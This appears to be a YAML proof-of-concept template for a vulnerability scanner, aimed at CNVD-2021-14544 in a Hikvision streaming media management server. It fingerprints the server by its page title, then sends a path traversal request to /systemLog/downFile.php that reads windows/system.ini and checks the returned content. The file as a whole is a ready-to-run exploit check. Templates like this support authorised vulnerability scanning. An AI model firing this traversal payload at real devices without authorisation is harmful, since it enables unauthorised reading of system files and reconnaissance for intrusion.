name: poc-yaml-hikvision-cnvd-2021-14544-file-download
binding: 7f541b25-11dd-413b-846d-17cf4c4e7678
manual: true
detail:
    author: Raiynin
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-14544
    vulnerability:
        id: CT-158998
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200 && (response.body_string.contains("<TITLE>流媒体管理服务器</TITLE>") || response.body.bcontains(b"<TITLE>Video Transmission Management Server</TITLE>"))
    r1:
        request:
            cache: true
            method: GET
            path: /systemLog/downFile.php?fileName=../../../../../../../windows/system.ini
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"; for 16-bit app support")
expression: r0() && r1()
